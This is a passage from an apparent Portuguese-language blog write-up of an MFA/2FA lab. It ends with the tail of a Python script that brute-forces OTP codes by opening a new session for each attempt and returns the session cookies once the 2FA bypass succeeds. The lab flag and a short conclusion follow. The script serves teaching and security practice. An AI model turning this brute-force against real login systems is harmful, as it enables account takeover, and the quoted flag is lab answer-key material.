+</span></span><span style="display:flex;"><span>            location_header <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Location&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Session cookies: </span><span style="color:#e6db74">{</span>session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get_dict()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Check if it successfully bypassed 2FA and landed on the dashboard</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> location_header <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/labs/third/dashboard&#39;</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Successfully bypassed 2FA with OTP: </span><span style="color:#e6db74">{</span>otp_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get_dict()  <span style="color:#75715e"># Return session cookies after successful bypass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> location_header <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/labs/third/&#39;</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Failed OTP attempt. Redirected to login. OTP: </span><span style="color:#e6db74">{</span>otp_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Unexpected redirect location: </span><span style="color:#e6db74">{</span>location_header<span style="color:#e6db74">}</span><span style="color:#e6db74">. OTP: </span><span style="color:#e6db74">{</span>otp_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Received status code </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">. Retrying...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the attack to try until success</span>
+</span></span><span style="display:flex;"><span>try_until_success()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>O script basicamente automatiza o processo de teste de PIN, para cada tentativa OTP uma nova sessão é criada, usando <code>requests.Session()</code>, isso garante que a página é atualizada, será feito o login com as credenciais do usuário, e realizado uma nova tentativa para descobrir o OTP.</p>
+<p><img src="/assets/img/posts/2025/02/MFA/shell-exploit.png" alt="shell exploit"  loading="lazy" /></p>
+<p>Agora com nosso <code>cookie</code> autenticado, iremos utiliza-lo no navegador.</p>
+<p><img src="/assets/img/posts/2025/02/MFA/flag%20lab3.png" alt="Flag lab 3"  loading="lazy" /></p>
+<p><strong>What is the flag in the dashboard?</strong><br>
+Resposta:<code>20548e076dbb9ba30c9d94ae4aceb38e</code></p>
+<h1 data-hextra-search-id="conclusão">Conclusão</h1><p>Nesta aula, obtivemos um entendimento mais claro sobre MFA e as diferenças entre MFA e 2FA. Abordamos os conceitos dos diferentes tipos de fatores de autenticação existentes e em quais cenários eles são normalmente utilizados. Além disso, foi apresentado, em aula prática, os tipos de vulnerabilidades comuns e as melhores práticas para mitigá-las.</p>
+
+          
+        </div>
+        <div class="hx:mt-16"></div>
+        
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hx:mx-auto hx:flex hx:gap-2 hx:py-2 hx:px-4 hextra-max-footer-width"><div class="hx:flex hx:justify-items-start ">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-02-03-mfa/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden">Claro</span><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden">Escuro</span><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+<span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden">Sistema</span></div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div><hr class="hx:border-gray-200 hx:dark:border-neutral-800" /><div class="hextra-custom-footer hextra-max-footer-width hx:mx-auto hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Com a tecnologia de Hextra<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <dialog
+    id="hextra-search-dialog"
+    class="hextra-search-dialog"
+    aria-label="Procurar..."
+  >
+    <div class="hextra-search">
+      <div class="hextra-search-input-wrapper"><svg class="hextra-search-input-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><input
+          class="hextra-search-input"
+          type="search"
+          role="combobox"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="Procurar..."
+          aria-label="Procurar..."
+          aria-controls="hextra-search-results"
+          aria-expanded="false"
+        /><button
+          type="button"
+          class="hextra-search-input-kbd"
+          data-search-close
+          aria-label="Close"
+        >ESC</button>
+      </div>
+      <div class="hextra-search-results-viewport" data-search-viewport>
+        <div class="hextra-search-results-inner hextra-scrollbar" data-search-inner>
+          <ul
+            id="hextra-search-results"
+            class="hextra-search-results"
+            role="listbox"
+            aria-label="Resultados da pesquisa"
+          ></ul>
+          <div class="hextra-search-empty" data-search-empty hidden>Nenhum resultado encontrado</div>
+        </div>
+      </div>
+      <div class="hextra-search-status hx:sr-only" aria-live="polite" role="status"></div>
+    </div>
+  </dialog>
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script><script defer src="/pt.search.js" integrity=""></script>
+    <script defer src="/pt.search-dialog.js" integrity=""></script>
+  </body>
+</html>
